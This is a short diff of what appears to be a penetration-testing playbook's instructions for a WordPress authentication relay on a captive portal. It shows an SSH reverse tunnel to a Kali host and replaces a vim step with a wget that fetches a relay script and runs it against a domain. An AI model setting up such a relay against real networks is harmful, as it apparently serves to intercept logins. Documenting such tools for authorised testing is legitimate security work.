@@ -27,7 +27,7 @@ PS C:\Users\user> ssh -R 9998:172.16.42.1:80 kali@<your kali ip> -N
 2. Start the wordpress relay in Kali:
 
 ┌──(selenium)─(kali㉿kali)-[~]
-└─$ vim wordpress-relay.py
+└─$ wget https://raw.githubusercontent.com/PentestPlaybook/auth-relay-framework/refs/heads/main/wordpress/captive-portal/execution/scripts/wordpress-relay.py -O wordpress-relay.py
 
 ┌──(selenium)─(kali㉿kali)-[~]
 └─$ python3 wordpress-relay.py --domain your-domain.info
